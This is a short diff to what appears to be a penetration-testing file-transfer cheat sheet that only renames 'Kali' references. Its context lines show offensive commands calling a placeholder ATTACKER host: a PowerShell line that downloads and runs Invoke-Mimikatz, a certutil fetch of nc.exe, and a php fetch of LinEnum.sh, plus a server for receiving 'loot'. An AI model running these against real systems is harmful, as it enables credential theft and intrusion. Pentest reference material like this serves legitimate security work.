@@ -296,7 +296,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://ATTACKER/Invoke-Mimikatz.
 `python3 -m http.server` cannot receive uploads; use `uploadserver`:
 
 ```bash
-# Kali
+# Linux
 python3 -m uploadserver 80
 ```
 
@@ -319,7 +319,7 @@ certutil.exe -verifyctl -split -f http://ATTACKER/nc.exe
 php -r '$file = file_get_contents("https://ATTACKER/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
 ```
 
-### Pulling loot back to Kali
+### Pulling loot back to the attacker host
 
 ```bash
 # SMB
